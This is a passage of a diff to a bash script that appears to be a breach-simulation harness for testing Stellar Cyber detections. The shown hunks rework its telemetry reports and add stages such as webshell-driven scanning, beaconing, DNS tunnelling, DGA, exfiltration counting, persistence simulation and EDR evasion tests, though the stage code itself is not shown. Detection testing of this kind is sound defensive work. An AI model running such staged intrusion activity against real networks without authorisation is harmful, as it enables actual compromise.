-$(read_state_file_or_none "stage_results.log" | sed 's/^/- /')
 EOF
-)" || log_message "WARN" "Could not write ${SUMMARY_TXT}"
-    safe_write_file "${CUSTOMER_SUMMARY_TXT}" "$(cat <<EOF
-Stellar Cyber PoC Customer Summary (Dry-Run)
-SIMULATED EXECUTION PLAN
-
-Expected / Likely Detections:
-- Internal Scan
-- SSH/Redis/Elastic/Mongo Enumeration
-- HTTP/HTTPS Recon
-- DNS Tunnel
-- Beaconing
-- SMB Recon / RPC Enumeration / AD Discovery
-- Exfiltration
-EOF
-)" || log_message "WARN" "Could not write ${CUSTOMER_SUMMARY_TXT}"
 }
 
-compile_summary_report() {
+append_telemetry_summary_to_report() {
     local beacon_total exfil_total beacon_attempt beacon_success exfil_attempt exfil_success
+    [[ -n "${REPORT_MD}" ]] || return 0
     beacon_total=$(sum_beacon_count)
     exfil_total=$(sum_exfil_count)
     beacon_attempt=$(sum_state_counter "beacon_attempt_count.log")
     beacon_success=$(sum_state_counter "beacon_success_count.log")
     exfil_attempt=$(sum_state_counter "exfil_attempt_count.log")
     exfil_success=$(sum_state_counter "exfil_success_count.log")
-    if [[ "${DRY_RUN}" == true ]]; then
-        simulate_dry_run_followup_counts
-        print_dry_run_plan
-        generate_dry_run_reports
-        append_followup_report_sections
-        return 0
-    fi
-    append_detection_matrix
-    append_stage_execution_summary
-    generate_customer_summary
-    safe_write_file "${SUMMARY_TXT}" "$(cat <<EOF
-==============================================================================
-Stellar Cyber PoC Telemetry Summary
-==============================================================================
+    cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true
+
+## Telemetry summary
+
+$(format_http_followup_summary_block)
+
+$(format_http_followup_capability_block)
+
+$(format_correlation_telemetry_summary_block)
+
 $(format_capability_matrix)
 
 Campaign ID            : ${CAMPAIGN_ID}
@@ -3085,8 +4296,8 @@ Attacker Callback Base : ${ATTACKER_BASE_URL}${CALLBACK_PREFIX}
 Attacker Port          : ${ATTACKER_PORT}
 Target Network         : ${TARGET_NET}
 Pipeline Schedule      : $(pipeline_schedule_description)
-Repeat Count           : $( [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]] && printf '%s' "${REPEAT_COUNT}" || printf 'single-run' )
-Duration Minutes       : $( [[ "${DURATION_MINUTES}" =~ ^[0-9]+$ && "${DURATION_MINUTES}" -gt 0 ]] && printf '%s' "${DURATION_MINUTES}" || printf 'n/a' )
+Pipeline Repeat Count  : $( [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]] && printf '%s' "${REPEAT_COUNT}" || printf 'single-run' )
+Duration Minutes       : $( [[ "${DURATION_MINUTES}" =~ ^[0-9]+$ && "${DURATION_MINUTES}" -gt 0 ]] && printf '%s' "${DURATION_MINUTES}" || printf 'n/a (repeat-count mode or single-run)' )
 Cycle Sleep (seconds)  : ${PIPELINE_CYCLE_SLEEP}
 Total Cycles Completed : ${TOTAL_CYCLES_COMPLETED}
 Auto Overlap           : ${AUTO_OVERLAP}
@@ -3104,7 +4315,7 @@ Artifacts Preserved    : ${KEEP_ARTIFACTS}
 
 $(format_path_isolation_block)
 
-Telemetry counters
+Attacker Callback / Beacon Telemetry (listener — not URL scan targets)
 - Beacon callback count : ${beacon_total}
 - Beacon attempts       : ${beacon_attempt}
 - Beacon successes      : ${beacon_success}
@@ -3139,26 +4350,80 @@ Service Follow-up Telemetry
 - Services discovered           : ${SERVICES_DISCOVERED_TOTAL}
 - Services usable (validated)   : ${SERVICES_USABLE_TOTAL:-0}
 - Follow-up actions total       : ${FOLLOWUP_ACTIONS_TOTAL}
-- HTTP planned / attempted / connected : ${HTTP_REQUESTS_PLANNED:-0} / ${HTTP_FOLLOWUP_ATTEMPTED:-0} / ${HTTP_FOLLOWUP_CONNECTED:-0}
+- HTTP planned / attempted / connected / responses : ${HTTP_REQUESTS_PLANNED:-0} / ${HTTP_REQUESTS_ATTEMPTED:-0} / ${HTTP_CONNECTED:-0} / ${HTTP_RESPONSES_RECEIVED:-0}
+- HTTP 403 / 404 / 405 count                    : ${HTTP_403_COUNT:-0} / ${HTTP_404_COUNT:-0} / ${HTTP_405_COUNT:-0}
+- HTTP failed / successful / fail ratio           : ${HTTP_SCAN_FAILED_RESPONSES:-0} / ${HTTP_SCAN_SUCCESS_RESPONSES:-0} / ${HTTP_SCAN_FAIL_RATIO:-0}%
+- Unique URLs Attempted                           : ${URL_SCAN_UNIQUE_ATTEMPTED:-0}
+- Unique Failed URLs                              : ${URL_SCAN_UNIQUE_FAILED:-0}
+- Unique Successful URLs                          : ${URL_SCAN_UNIQUE_SUCCESS:-0}
+- Failure Ratio (unique)                          : ${URL_SCAN_UNIQUE_FAIL_RATIO:-0}%
+- Estimated Weighted Anomaly Score Contribution   : ${URL_SCAN_ANOMALY_SCORE:-0}
+- Expected Detection                              : External URL Reconnaissance Anomaly
+- Expected Event                                  : external_url_scan
+- Expected Technique                              : T1595 Active Scanning
+- PROPFIND / POST / OPTIONS count                 : ${HTTP_PROPFIND_COUNT:-0} / ${HTTP_POST_COUNT:-0} / ${HTTP_OPTIONS_COUNT:-0}
+- Threat hunt URL requests                        : ${THREAT_HUNT_URL_REQUESTS:-0}
+- Abnormal User-Agent count     : ${ABNORMAL_USER_AGENT_COUNT:-0}
+- Normal User-Agent count       : ${NORMAL_USER_AGENT_COUNT:-0}
+- Rare User-Agent count         : ${RARE_USER_AGENT_COUNT:-0}
+- Payload User-Agent count      : ${PAYLOAD_USER_AGENT_COUNT:-0}
+- SQLi-style UA count           : ${UA_SQLI_STYLE_COUNT:-0}
+- Encoding-abuse UA count       : ${UA_ENCODING_ABUSE_COUNT:-0}
+- Command-style UA count        : ${UA_COMMAND_STYLE_COUNT:-0}
+- Rare User-Agent count         : ${RARE_USER_AGENT_COUNT:-0}
 - HTTP requests (counter)       : ${FOLLOWUP_HTTP_REQUESTS}
+- HTTP follow-up mode           : ${HTTP_FOLLOWUP_MODE}
+- Expected HTTP detection impact: ${EXPECTED_HTTP_DETECTION_IMPACT}
 - SSH planned / attempted / auth failures observed : ${SSH_ATTEMPTS_PLANNED:-0} / ${SSH_AUTH_ATTEMPTED:-0} / ${SSH_AUTH_FAILURES_OBSERVED:-0}
 - SSH auth failures (counter)   : ${FOLLOWUP_SSH_AUTH_FAILURES} (executed ${SSH_ATTEMPTS_EXECUTED})
 - SMB planned / attempted / connected : ${SMB_PROBES_PLANNED:-0} / ${SMB_PROBES_ATTEMPTED:-0} / ${SMB_PROBES_CONNECTED:-0}
 - SMB probe count (counter)     : ${FOLLOWUP_SMB_PROBES}
 - DNS planned / attempted       : ${DNS_BURST_COUNT:-0} / ${DNS_QUERIES_ATTEMPTED:-0}
+- DNS enhanced planned          : ${DNS_QUERIES_PLANNED:-0}
+- DNS effective-TLD / cluster.local / powerapps / suspicious / HTTPS / entropy : ${DNS_EFFECTIVE_TLD_COUNT:-0} / ${DNS_CLUSTER_LOCAL_COUNT:-0} / ${DNS_POWERAPPS_STYLE_COUNT:-0} / ${DNS_SUSPICIOUS_TLD_COUNT:-0} / ${DNS_HTTPS_QUERY_COUNT:-0} / ${DNS_TOTAL_ENTROPY_STYLE_COUNT:-0}
+- Internal fanout attempted     : ${INTERNAL_FANOUT_ATTEMPTED:-0}
+- Non-standard port connections : ${NONSTANDARD_PORT_CONNECTIONS:-0}
 - DNS query count (counter)     : ${FOLLOWUP_DNS_QUERIES}
 - Persistent beacon enabled     : ${PERSISTENT_BEACON}
-- Overlap enabled               : ${PIPELINE_OVERLAP}
+- Pipeline overlap configured   : ${PIPELINE_OVERLAP}
+- Overlap workers executed      : ${OVERLAP_EXECUTED}
+- Overlap enabled (legacy)      : ${PIPELINE_OVERLAP}
 - SCAN-ONLY FAILURE             : ${SCAN_ONLY_WARNING}
 - Follow-up validation failed   : ${FOLLOWUP_VALIDATION_FAILED}
 - ML spike indicators           : high-volume HTTP/SSH/DNS/SMB bursts + overlap timeline + beacon persistence
-==============================================================================
+
+$(append_degraded_stage_summary)
+$(format_validation_result_block)
 EOF
-)" || log_message "WARN" "Could not write ${SUMMARY_TXT}"
+}
+
+compile_summary_report() {
+    local beacon_total exfil_total beacon_attempt beacon_success exfil_attempt exfil_success
+    load_overlap_stage_results_from_state
+    beacon_total=$(sum_beacon_count)
+    exfil_total=$(sum_exfil_count)
+    beacon_attempt=$(sum_state_counter "beacon_attempt_count.log")
+    beacon_success=$(sum_state_counter "beacon_success_count.log")
+    exfil_attempt=$(sum_state_counter "exfil_attempt_count.log")
+    exfil_success=$(sum_state_counter "exfil_success_count.log")
+    if [[ "${DRY_RUN}" == true ]]; then
+        simulate_dry_run_followup_counts
+        print_dry_run_plan
+        generate_dry_run_reports
+        append_followup_report_sections
+        fast_safe_mode_enabled && write_fast_safe_summary_block
+        return 0
+    fi
+    append_detection_matrix
+    append_stage_execution_summary
+    generate_customer_summary
+    append_telemetry_summary_to_report
     append_followup_report_sections
     append_humanize_report_sections
-    if [[ -f "${SUMMARY_TXT}" ]]; then
-        cat "${SUMMARY_TXT}"
+    fast_safe_mode_enabled && write_fast_safe_summary_block
+    poc_obs_finalize_report 2>/dev/null || true
+    if [[ -f "${REPORT_MD}" ]]; then
+        awk '/^## Telemetry summary/,0' "${REPORT_MD}" 2>/dev/null | head -n 150
     fi
 }
 
@@ -3172,14 +4437,14 @@ Webshell        : ${WEB_SHELL_URL}
 Attacker        : ${ATTACKER_BASE_URL}
 Target Net      : ${TARGET_NET}
 Intensity       : ${POC_INTENSITY} (HTTP ${HTTP_FOLLOWUP_REQUESTS}/host, SSH ${SSH_BURST_ATTEMPTS}/host, DNS ${DNS_BURST_COUNT}, SMB ${SMB_PROBE_TARGET}/host)
-Duration        : ${DURATION_MINUTES} minute(s) | Schedule: $(pipeline_schedule_description)
+Duration        : $(pipeline_duration_label) | Schedule: $(pipeline_schedule_description)
 Persistent Beacon: ${PERSISTENT_BEACON} | Overlap: ${PIPELINE_OVERLAP} | Burst: ${BURST_MODE}
 Remote Runtime  : ${REMOTE_RUNTIME_DIR}
 Local Report    : ${EFFECTIVE_REPORT_DIR}
 Dry Run         : ${DRY_RUN}
 EOF
-)"
-    echo ""
+)" >&2
+    echo "" >&2
     if [[ "${RUNTIME_FALLBACK_USED}" == true ]]; then
         log_message "WARN" "Remote runtime fallback is active — verify REMOTE_RUNTIME_DIR matches the webshell host user (e.g. /tmp/.poc_runtime_www-data)."
     fi
@@ -3192,7 +4457,8 @@ Next Steps in Stellar:
 2. Check Internal Scan alerts
 3. Check Beaconing detections
 4. Check DNS Tunnel detections
-5. Check Correlated Cases
+5. Check DGA / high-entropy DNS detections
+6. Check Correlated Cases
 EOF
 }
 
@@ -3202,38 +4468,21 @@ validate_report_artifacts() {
         log_message "WARN" "Report file missing: ${REPORT_MD}"
         ok=false
     fi
-    if [[ -n "${SUMMARY_TXT}" && ! -f "${SUMMARY_TXT}" ]]; then
-        log_message "WARN" "Summary file missing: ${SUMMARY_TXT}"
-        ok=false
-    fi
-    if [[ -n "${CUSTOMER_SUMMARY_TXT}" && ! -f "${CUSTOMER_SUMMARY_TXT}" ]]; then
-        log_message "WARN" "Customer summary missing: ${CUSTOMER_SUMMARY_TXT}"
-        ok=false
-    fi
     if [[ -n "${LOG_FILE}" && ! -f "${LOG_FILE}" ]]; then
-        log_message "WARN" "Operator log missing: ${LOG_FILE}"
-        ok=false
-    fi
-    if [[ -n "${TIMELINE_LOG}" && ! -f "${TIMELINE_LOG}" ]]; then
-        log_message "WARN" "Timeline log missing: ${TIMELINE_LOG}"
+        log_message "WARN" "Execution log missing: ${LOG_FILE}"
         ok=false
     fi
     [[ "${ok}" == true ]]
 }
 
 print_artifacts() {
-    local report_status="missing" log_status="missing" timeline_status="missing" customer_status="missing"
+    local report_status="missing" log_status="missing"
     [[ -f "${REPORT_MD}" ]] && report_status="present"
-    [[ -d "${LOG_DIR}" ]] && log_status="present"
-    [[ -f "${TIMELINE_LOG}" ]] && timeline_status="present"
-    [[ -f "${CUSTOMER_SUMMARY_TXT}" ]] && customer_status="present"
+    [[ -f "${POC_EXECUTION_LOG:-${LOG_FILE}}" ]] && log_status="present"
     cat <<EOF
 Artifacts (report preserved=${REPORT_PRESERVED}, copy=${REPORT_COPY_PERFORMED}):
-- report path: ${REPORT_MD} [${report_status}]
-- logs path: ${LOG_DIR} [${log_status}]
-- timeline path: ${TIMELINE_LOG} [${timeline_status}]
-- customer summary path: ${CUSTOMER_SUMMARY_TXT} [${customer_status}]
-- summary path: ${SUMMARY_TXT}
+- log:    ${POC_EXECUTION_LOG:-${LOG_FILE}} [${log_status}]
+- report: ${POC_REPORT_CWD:-${REPORT_MD}} [${report_status}]
 - remote runtime path (ephemeral=${RUNTIME_EPHEMERAL}): ${REMOTE_RUNTIME_DIR}
 - local state path: ${LOCAL_STATE_DIR}
 EOF
@@ -3255,21 +4504,27 @@ main() {
     trap cleanup_background_jobs EXIT
     trap on_pipeline_signal INT TERM
     trap on_pipeline_err ERR
+    POC_START_EPOCH=$(date +%s)
     if [[ $# -eq 0 ]]; then
         show_usage_menu
         exit 0
     fi
     parse_cli_switches "$@"
     validate_inputs
+    probe_webshell_connectivity_or_exit
+    apply_profile_defaults
     apply_user_intensity_profile
+    apply_fast_safe_profile
     apply_cli_telemetry_overrides
     resolve_runtime_dir
     if [[ "${KEEP_ARTIFACTS}" == true ]]; then
         CLEANUP_RUNTIME_ON_EXIT=false
     fi
     setup_environment
+    poc_obs_print_run_header 2>/dev/null || true
     audit_remote_payload_isolation || true
     assess_local_capabilities
+    poc_obs_print_environment_validation 2>/dev/null || true
     render_banner
     stage_runtime_validation
 
@@ -3284,17 +4539,28 @@ main() {
     # 6) callback reachability / 7) DNS validation
     stage_post_assessment_validations
 
-    stage_warmup_phase
-    start_humanize_services
+    # Attacker-side URL recon against webshell host (local curl/python — not via webshell)
+    if [[ -z "${SINGLE_STAGE}" ]]; then
+        stage_pre_webshell_url_scan
+    fi
+
+    if fast_safe_mode_enabled; then
+        log_message "OK" "FAST_SAFE: skipping warmup and background humanize services"
+    else
+        stage_warmup_phase
+        start_humanize_services
+    fi
 
     if [[ -n "${SINGLE_STAGE}" ]]; then
         case "${SINGLE_STAGE}" in
             foothold) stage_initial_foothold ;;
             preflight_validation) stage_preflight_validation ;;
+            pre_webshell_url_scan) stage_pre_webshell_url_scan ;;
             runtime_validation) stage_runtime_validation ;;
             host_discovery) stage_host_discovery ;;
             network_discovery) stage_network_discovery ;;
             service_discovery) stage_service_discovery ;;
+            http_candidate_discovery) stage_discover_http_candidates ;;
             tcp_fanout) stage_tcp_fanout ;;
             ssh_followup) stage_ssh_followup ;;
             redis_followup) stage_redis_followup ;;
@@ -3302,7 +4568,9 @@ main() {
             mongo_followup) stage_mongo_followup ;;
             http_followup) stage_http_followup ;;
             windows_telemetry) stage_windows_telemetry ;;
+            dns_new_tld_test) stage_dns_new_tld_test ;;
             dns_tunnel) stage_dns_tunnel_simulation ;;
+            dga_simulation) stage_dga_simulation ;;
             beaconing) stage_beaconing ;;
             process_chain) stage_realistic_process_chains ;;
             persistence_simulation) stage_persistence_simulation ;;
@@ -3313,6 +4581,16 @@ main() {
             burst) stage_burst_activity ;;
             ssh_auth_burst) stage_ssh_auth_burst ;;
             followup_validation) stage_followup_validation ;;
+            web_reachability) stage_validate_web_reachability ;;
+            http_url_scan) followup_stage_http ;;
+            ids_waf_signature_probe) stage_ids_waf_signature_probe ;;
+            external_callback) stage_external_callback ;;
+            internal_web_fanout) stage_internal_web_fanout ;;
+            dns_tunnel_enhanced) stage_dns_tunnel_enhanced ;;
+            nonstandard_port_followup) stage_nonstandard_port_followup ;;
+            edr_static_detection_test) stage_edr_static_detection_test ;;
+            correlation_bundle) stage_correlation_telemetry_bundle ;;
+            fast_safe) run_fast_safe_pipeline_once ;;
             *) log_message "ERROR" "Unknown --single-stage: ${SINGLE_STAGE}"; exit 1 ;;
         esac
         compile_summary_report
